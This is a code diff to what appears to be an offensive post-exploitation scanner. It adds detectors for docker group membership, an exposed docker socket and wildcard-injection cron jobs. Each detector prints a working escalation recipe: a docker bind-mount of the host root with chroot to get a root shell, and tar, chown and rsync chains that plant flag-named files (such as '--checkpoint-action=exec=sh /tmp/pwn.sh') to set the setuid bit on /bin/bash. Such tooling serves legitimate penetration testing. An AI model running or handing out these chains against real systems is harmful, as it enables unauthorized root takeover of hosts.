@@ -1936,6 +1936,43 @@ _AJP_GNMAP = re.compile(
     r'(?i)Host:\s+([\w.:]+)[^\r\n]*8009/open/tcp//ajp13?/'
 )
 
+# iter-216: Docker socket exposure = direct root. Two shapes:
+#   (A) `id` / `groups` output showing membership in `docker` group -
+#       any member can bind-mount the host root into a container:
+#       `docker run --rm -v /:/mnt alpine chroot /mnt sh` -> root.
+#   (B) `ls -la /var/run/docker.sock` showing the socket exists with
+#       group-writable perms - equivalent primitive.
+_DOCKER_GROUP_ID = re.compile(
+    r'(?im)^\s*uid=\d+\([\w\-.]+\)\s+gid=\d+\([\w\-.]+\)\s+'
+    r'groups=[^\r\n]*?\b\d+\(docker\)'
+)
+_DOCKER_GROUP_GROUPS = re.compile(
+    r'(?m)^\s*\S+\s*:\s*[^\r\n]*\bdocker\b[^\r\n]*$'
+)
+_DOCKER_SOCK_LS = re.compile(
+    r'(?im)^s\S{9,10}\s+\d+\s+root\s+(?:root|docker)\s+\d+\s+'
+    r'\S+\s+\S+\s+\S+\s+/var/run/docker\.sock'
+)
+
+# iter-216: wildcard-injection chain (root cron/script that does
+# `tar cf X *` or `chown user:user *` in a user-writable dir). The
+# canonical exploit: drop `--checkpoint=1` + `--checkpoint-action=
+# exec=/tmp/pwn.sh` files (or `--reference=/root/.ssh/id_rsa` for
+# chown) into the glob dir; when the root task runs, tar/chown
+# interprets the filenames as CLI flags.
+_WILDCARD_TAR = re.compile(
+    r'(?i)\btar\s+[-]?[cvfzjJx]+\s+\S+\s+\*(?:\s|$)'
+)
+_WILDCARD_CHOWN = re.compile(
+    r'(?i)\bchown\s+(?:-R\s+)?[\w:.\-]+\s+(?:/\S+/)?\*(?:\s|$)'
+)
+_WILDCARD_CHMOD = re.compile(
+    r'(?i)\bchmod\s+(?:-R\s+)?[\w:.\-+=]+\s+(?:/\S+/)?\*(?:\s|$)'
+)
+_WILDCARD_RSYNC = re.compile(
+    r'(?i)\brsync\s+[^\r\n]*?\s+\*(?:\s|$)'
+)
+
 # iter-214: RDP NLA-disabled + rdp-ntlm-info intel from nmap scripts.
 # Two things worth surfacing:
 #
@@ -3558,6 +3595,106 @@ def _multiline_passes(path, report, store):
                                  f"  |  fill <rdp-host> with "
                                  f"{_cn.group(1) if _cn else 'HOST'}"
                                  f"{_bluekeep}"))
+
+    # iter-216: Docker socket exposure = direct root primitive. Emits
+    # HIGH when either (a) captured id/groups output shows docker
+    # membership, or (b) an ls of /var/run/docker.sock is captured.
+    # Doc-file gate applies; no filename gate because these signals
+    # can appear in linpeas/lse/manual enum notes with many names.
+    if not filters.is_doc_file(path):
+        _docker_hit = False
+        _idm = _DOCKER_GROUP_ID.search(text)
+        if _idm:
+            report.add("HIGH", "INTERESTING FILES", path, _ln(_idm),
+                       "docker group membership (direct root escape)",
+                       hint=("docker run --rm -it -v /:/mnt alpine "
+                             "chroot /mnt sh  |  or without pull: "
+                             "docker run --rm -it -v /:/mnt "
+                             "$(docker images -q | head -1) "
+                             "chroot /mnt sh  |  no auth needed - "
+                             "docker socket is world-writable to group"))
+            _docker_hit = True
+        # /etc/group entry: `docker:x:999:user1,user2` shows non-root
+        # accounts with docker escape. Reuse a narrower pattern.
+        if not _docker_hit:
+            _grp_m = re.search(
+                r'(?m)^docker:x:\d+:([\w,\-]{1,200})$', text)
+            if _grp_m:
+                _members = _grp_m.group(1).strip()
+                if _members:
+                    report.add("HIGH", "INTERESTING FILES", path,
+                               _ln(_grp_m),
+                               f"/etc/group docker members "
+                               f"({_members[:60]}) - direct root escape",
+                               hint=("docker run --rm -it -v /:/mnt "
+                                     "alpine chroot /mnt sh  |  as any "
+                                     f"of: {_members[:60]}"))
+                    _docker_hit = True
+        if not _docker_hit:
+            _sm = _DOCKER_SOCK_LS.search(text)
+            if _sm:
+                report.add("HIGH", "INTERESTING FILES", path, _ln(_sm),
+                           "/var/run/docker.sock present in captured "
+                           "ls - direct root primitive",
+                           hint=("docker -H unix:///var/run/docker.sock "
+                                 "run --rm -v /:/mnt alpine chroot "
+                                 "/mnt sh  |  needs docker CLI or curl "
+                                 "--unix-socket /var/run/docker.sock "
+                                 "http://localhost/containers/..."))
+                _docker_hit = True
+
+    # iter-216: wildcard-injection chain. Doc-file gate applies;
+    # narrow filename gate to avoid tutorial FPs while still catching
+    # cron/script/linpeas captures.
+    _plow_wc = path.lower()
+    _wc_gate = (_plow_wc.endswith(("crontab", "cron.d", "cron", ".sh",
+                                     ".bash", ".zsh", ".cron", ".txt",
+                                     ".log", ".md"))
+                or "cron" in os.path.basename(_plow_wc)
+                or "linpeas" in _plow_wc
+                or "lse" in _plow_wc
+                or "priv" in _plow_wc
+                or "/etc/cron" in _plow_wc)
+    if _wc_gate and not filters.is_doc_file(path):
+        _wc_findings = []
+        for m in _WILDCARD_TAR.finditer(text):
+            _wc_findings.append(("tar", m))
+        for m in _WILDCARD_CHOWN.finditer(text):
+            _wc_findings.append(("chown", m))
+        for m in _WILDCARD_CHMOD.finditer(text):
+            _wc_findings.append(("chmod", m))
+        for m in _WILDCARD_RSYNC.finditer(text):
+            _wc_findings.append(("rsync", m))
+        _seen_wc = set()
+        for _kind, _m in _wc_findings[:5]:
+            _line_txt = _m.group(0).strip()[:100]
+            if _line_txt in _seen_wc:
+                continue
+            _seen_wc.add(_line_txt)
+            if _kind == "tar":
+                _atk = ("chain: cd <writable-dir>; "
+                        "touch -- '--checkpoint=1'; "
+                        "touch -- '--checkpoint-action=exec=sh /tmp/pwn.sh'; "
+                        "echo 'chmod +s /bin/bash' > /tmp/pwn.sh; "
+                        "chmod +x /tmp/pwn.sh")
+            elif _kind == "chown":
+                _atk = ("chain: cd <writable-dir>; "
+                        "ln -s /root/.ssh/authorized_keys "
+                        "'--reference=/tmp/mine'  |  or use "
+                        "--from=<victim>:<victim> to hijack file "
+                        "ownership")
+            elif _kind == "chmod":
+                _atk = ("chain: less useful than tar/chown but "
+                        "--reference=/tmp/marker can propagate a "
+                        "mode - drop a file with the target perms")
+            else:  # rsync
+                _atk = ("chain: cd <writable-dir>; touch -- '-e sh "
+                        "/tmp/pwn.sh'  |  rsync -e triggers shell "
+                        "exec on the source side")
+            report.add("HIGH", "INTERESTING FILES", path, _ln(_m),
+                       f"wildcard-injection candidate: {_line_txt}",
+                       hint=(f"if this runs as a higher-priv user in a "
+                             f"dir YOU can write: {_atk}"))
 
     # Mimikatz NTLM block (logonpasswords)
     for m in _MK_NTLM.finditer(text):
